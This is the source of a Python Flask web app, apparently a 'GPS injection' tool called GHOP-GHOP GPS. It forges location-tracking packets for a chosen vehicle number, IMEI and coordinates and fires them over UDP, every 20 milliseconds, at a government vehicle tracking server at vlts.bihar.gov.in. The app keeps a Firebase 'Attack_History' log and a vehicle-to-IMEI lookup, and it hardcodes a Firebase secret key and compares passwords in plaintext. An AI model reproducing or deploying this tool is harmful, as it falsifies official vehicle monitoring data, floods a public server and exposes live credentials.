import os, socket, threading, time, requests, random, uuid
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_final_multi_device_edition"

FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

user_sessions = {}

def get_ist_time():
    return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)

def get_sid():
    return session.get('device_sid', 'guest')

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🫦 GHOP-GHOP GPS</h2>
        {% if error %}<div style="color:red; font-size:12px; margin-bottom:10px;">{{error}}</div>{% endif %}
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN</button>
        </form>
    </div>
</body>
</html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .score-bar { background: #050505; border: 1px solid #0f0; width: 100%; max-width: 480px; padding: 10px; border-radius: 10px; display: flex; justify-content: space-around; font-size: 11px; margin-bottom: -10px; box-shadow: 0 0 10px #0f0; }
        .s-val { color: #fff; font-weight: bold; }
        .s-ok { color: #0f0; font-weight: bold; }
        .s-fail { color: #f00; font-weight: bold; }
        .s-err { color: yellow; font-weight: bold; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input { width: 94%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .reset { background: #333; color: #fff; border: 1px solid #444; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
    </style>
</head>
<body>
    <div class="score-bar">
        <span>TOTAL: <span id="s_total" class="s-val">0</span></span>
        <span>SUCCESS: <span id="s_ok" class="s-ok">0</span></span>
        <span>FAIL: <span id="s_fail" class="s-fail">0</span></span>
        <span>ERROR: <span id="s_err" class="s-err">0</span></span>
    </div>
    <div class="box">
        <form action="/logout" method="post"><button style="color:red; background:none; border:1px solid red; padding:5px; cursor:pointer; font-size:10px;">LOGOUT: {{user_id}}</button></form>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}" oninput="updatePreview();"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}" oninput="updatePreview();"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}" oninput="updatePreview();"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            <div class="full"><label>📋 PACKET PREVIEW </label><div class="preview" id="preview">Ready...</div></div>
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
        <hr style="border:1px solid #111; margin: 15px 0;">
        <a href="/restore_my_data" style="color:yellow; text-decoration:none; font-size:12px; display:block; text-align:center;">🔄 RESTORE OLD DATA</a>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{status.lat}}, {{status.lon}}], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{status.lat}}, {{status.lon}}]).addTo(map);
        function updateMap(lat, lon) { marker.setLatLng([lat, lon]); map.setView([lat, lon], 15); }
        function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { let lt = pos.coords.latitude.toFixed(6); let ln = pos.coords.longitude.toFixed(6); document.getElementById('lat').value = lt; document.getElementById('lon').value = ln; updateMap(lt, ln); updatePreview(); }, null, {enableHighAccuracy:true}); } }
        
        function updatePreview() {
            let tags = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"];
            let cnt = parseInt(document.getElementById('cnt').innerText) || 0;
            let tag = tags[cnt % tags.length];
            let imei = document.getElementById('imei').value;
            let vno = document.getElementById('vno').value;
            let lat = document.getElementById('lat').value;
            let lon = document.getElementById('lon').value;
            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
            let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
            let str = `$PVT,${tag},1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
            document.getElementById('preview').innerText = str;
        }

        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase();
            let res = await fetch(`/check_vehicle?vno=${vno}`);
            let data = await res.json();
            if(data.imei) { document.getElementById('imei').value = data.imei; updatePreview(); }
        }

        // AUTO REFRESH 30 SECONDS
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count;
                if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
                else updatePreview();
                if(d.score) {
                    document.getElementById('s_total').innerText = d.score.total || 0;
                    document.getElementById('s_ok').innerText = d.score.ok || 0;
                    document.getElementById('s_fail').innerText = d.score.fail || 0;
                    document.getElementById('s_err').innerText = d.score.error || 0;
                }
            });
        }, 30000); 

        updatePreview();
    </script>
</body>
</html>
"""

def log_to_firebase(uid, status_obj):
    try:
        now = get_ist_time()
        sid = status_obj["session_id"]
        log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S')}
        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine(session_key):
    target = ("vlts.bihar.gov.in", 9999)
    while user_sessions.get(session_key, {}).get("firing"):
        try:
            s = user_sessions[session_key]
            tag = TAG_LIST[s["count"] % len(TAG_LIST)]
            now = get_ist_time()
            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{s['imei']},{s['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{s['lat']},N,{s['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
            user_sessions[session_key]["last_pkt"] = pkt
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(pkt.encode(), target)
            user_sessions[session_key]["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        uid = request.form.get('userid', '').strip()
        pw = request.form.get('password', '').strip()
        data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
        if data and str(data.get('password')) == str(pw):
            session['user'] = uid
            sid_key = str(uuid.uuid4())
            session['device_sid'] = sid_key
            if sid_key not in user_sessions:
                user_sessions[sid_key] = {"uid": uid, "firing": False, "count": 0, "imei": "", "vno": "", "lat": str(data.get('lat', '25.298801')), "lon": str(data.get('lon', '84.651033')), "last_pkt": "Ready...", "session_id": "", "score": {}}
            return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard():
    uid = session.get('user')
    sid_key = get_sid()
    if not uid or sid_key not in user_sessions: 
        session.clear()
        return redirect(url_for('login'))
    return render_template_string(DASH_HTML, user_id=uid, status=user_sessions[sid_key])

@app.route('/action', methods=['POST'])
def action():
    uid = session.get('user')
    sid_key = get_sid()
    if not uid or sid_key not in user_sessions: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "start" and not user_sessions[sid_key]["firing"]:
        user_sessions[sid_key].update({"firing":True, "session_id":get_ist_time().strftime('%H%M%S'), "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
        log_to_firebase(uid, user_sessions[sid_key])
        threading.Thread(target=firing_engine, args=(sid_key,), daemon=True).start()
    elif val == "stop": user_sessions[sid_key]["firing"] = False
    elif val == "reset": user_sessions[sid_key].update({"firing":False, "count":0, "imei":"", "vno":""})
    return redirect(url_for('dashboard'))

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei":None})

@app.route('/data')
def data():
    sid_key = get_sid()
    s_data = user_sessions.get(sid_key, {})
    if s_data and 'uid' in s_data:
        try:
            today = get_ist_time().strftime('%Y-%m-%d')
            uid = s_data['uid']
            # FETCHING DIRECT FROM USER_AUDIT
            score_res = requests.get(f"{FB_URL}/User_Audit/{today}/{uid}.json?auth={FB_SECRET}", timeout=5).json()
            if score_res:
                user_sessions[sid_key]['score'] = score_res
        except: pass
    return jsonify(user_sessions.get(sid_key, {}))

@app.route('/restore_my_data')
def restore_data():
    history = requests.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
    count = 0
    if history:
        for date in history:
            for user in history[date]:
                for key in history[date][user]:
                    node = history[date][user][key]
                    if isinstance(node, dict) and "IMEI_No" not in node:
                        for time_node in node:
                            data = node[time_node]
                            if data.get('Vehicle_No') and data.get('IMEI_No'):
                                requests.put(f"{FB_URL}/Data_Records/{data['Vehicle_No']}.json?auth={FB_SECRET}", json=data)
                                count += 1
                    elif isinstance(node, dict) and node.get('Vehicle_No'):
                        requests.put(f"{FB_URL}/Data_Records/{node['Vehicle_No']}.json?auth={FB_SECRET}", json=node)
                        count += 1
    return f"Success! {count} vehicles restored. <a href='/dashboard'>Go Back</a>"

@app.route('/logout', methods=['POST'])
def logout():
    sid_key = get_sid()
    if sid_key in user_sessions: del user_sessions[sid_key]
    session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
